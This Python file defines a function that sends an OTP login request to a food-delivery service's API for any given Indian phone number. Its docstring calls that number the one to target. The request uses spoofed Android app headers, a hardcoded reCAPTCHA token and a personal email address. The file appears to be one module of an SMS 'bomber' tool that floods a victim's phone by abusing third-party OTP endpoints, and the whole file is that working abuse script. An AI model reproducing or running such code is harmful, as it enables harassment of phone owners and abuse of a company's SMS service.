import requests
import json

def run(phone_number):
    """
    Sends an OTP request using the provided phone number.

    :param phone_number: The phone number to target (without country code).
    """
    # API URL
    url = "https://hub.delivery-kpg.com/public/api/generate-otp-for-login"
    
    # Payload
    payload = {
        "phone": f"+91{phone_number}",
        "email": "shivamrajput662@gmail.com",
        "google_recaptcha_token": "03AFcWeA5ip8aWRthIN6qxOWPtgAOE175LK0itOcUGvGOy-zJ0LuC6xRIYRFaoRv55HxmdUzT1MeMx--45XGlWmzAxGQrOFKOqRRrcdP6axEhVC5pZFoEqs0WuNjq0qvD3BiwY3WIfJMFiEGiLLuDy-KJV0MhBf5hIzTNyDKlewon8sOW2YjlMr57SR0YopSG3b5cXa0P1dAoVl7bUMFCQsmE-C9jjDrLsaI0gH5l9rwC8RAv1vjqHzoJRSV-bkq5k4a7X6lpaIt4eAS9JvrkOiuYHjLkFWcWOSajAAYdNMmaL5brxdLghpCrlSc9H8KRkQxO9I7z8gbeZOLNXVT3nezbVaTp4sRS0Dcrc5ctbESWBnN4K-rgpIRQP3WzwQQeMC5OuiFlTxrA6UzO5fAjDXSvh9lQQt3XUSoVz9Fp-qZtBD3wNZChyKxFMnC9CZtn4hbxksr2T-AAp9WO65b-oDqLIj9_bOKQ34deKucmcb1ymyDtXWfqRXxPOEYHuwJbPphBl0JRUHwmC1XT4dl6wsgCSEzRkS9WBLSyqANzxjVjLPYt2U-VjeTpUVKHeTAO95br1BgF3fXnmvSQlONB206l6ija97xyzTuwcEdAd0a-rSoSVK0MzCQbVBweldiE2O3hfzOD2onHfxAJqqHGPcS5_rvyWaubAbYi-8dcNUXfwBSFRobJluwAibBv-QWgvwDHQdZyuUQVJ7WBbkWZago3LN3fVBhPezxlYw23S0BF2isybs8StEup9ROQrKadOyhomthkk-BGKrgc6ULZorFprYrKWlJ3nQyxtKM0IsiRBNL0Lx_StPOpK8QLHzHnduDBl5XcQXjqrTkcl9_E-K1U_vPaWPQN7yScxB8nq1jK1hPMWBiN-yYJ3tUWXGa3Vg6sFzNsF5GOm4p5a5c19WkdOFQlDYbBRCoBI0jOOV8Jp2wNPaGgBi1_gXUVpbWY18J-lvMyfTv8nt7jGvk3-o0gJQD2ZcevjjYpD6f5bp6-Oyo7dM7XFZZPIW4aYQpGejAb-k3hI4nKV3w4VP8V1fcnBUArVJxkqFI3Hvp1hBchkNkE8yGbDOp9J_sHuojAudZEsV2CUOkWoD9EiiYF4sroU5tIji79L6S_U4qO5GBn6rQAz2VT0BqJmg2vjDs5G0ONPxhMrtKisKwiMGCFvLkim10EfOG4hznmrTpTheJPqOpsVReskj_dME0TSox-eKlQeEJyuyD16gftDa73CDHnDl0IR0D66rribmbec3MuFjDzhxCRvcOecAJZGUKNukhXoRAsgo_3mzVPWKVSeRtkZh1Zqx4X5J_Lpr7zdEyoDiev4yqJGGV6w1_45BMICeZfWVE3XXymjc6Ccd7wZWwNRatSAzCKXNb98PQY6F7IrsMzvLFPx87GSvj-GbEbQUg5zmVsqEBJE4o6JdJf0b4aSw9F8ZMBvQ7nYtKOtGnjp1EI01TJAhnN3ffOSBphspsdMLwwXE8F5BYHSMc7umgrAraoLCaPuXnTdhNGN50o0dhJAp4wPLZWemacb3KYYAxKih7Uiw9KZgIZPuuHBRh4_75HxTtOafFKLwp7cIhAl1m-sfNRnNGckZQ0vQ9otcJKXEljK9L-jvsD92elqB4Hpmz26beo26znRmvxQjddRA43u2K0xpZaDGC6EOWwgx-sKSQD2hn99XdUrYbhn-yHJ3_NgAm3QOpWa8ISbghncFZJufv7PSZdXY-vbHHz_HaeJb3ufI-EN6PgCP3JxYK4cqtvR1LaXCrS8AJ35r51fIIqoe-L3cfeAAQ3f7kjgTUJ6dyvDRVc_w848BolscRGHv2Dw1raS86-97-h-lPFea--9iYwQzFQcUU0fQx7WUDnZjyWMzNJj-ZWE-YygZ16D7j9kZJ-LJK6h6wyzuMIUZxM5NvL6ADZeIAWBOQOE0Bcc8jQBK1oeX-tGCZpYtLSlU7CAbFYqGmFOuqE8qwO62Yd3cQHYQgID3boP3dl7-jr8WMqx5W4wbmBt1cyGJxfaTQfO2XxR0cyrFLZKWWLhxwQOUJgaY0"
    }

    # Headers
    headers = {
        "Host": "hub.delivery-kpg.com",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Android WebView\";v=\"126\"",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "FoodomaaAndroidWebViewUA",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://delivery-kpg.com",
        "x-requested-with": "com.deliverykpg.app",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://delivery-kpg.com/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "priority": "u=1, i"
    }

    # Make the POST request
    response = requests.post(url, headers=headers, json=payload)

    # Check the response
    if response.ok:
        print("Response:", response.json())
    else:
        print(f"Failed to send OTP. Status code: {response.status_code}, Response: {response.text}")

# Example usage
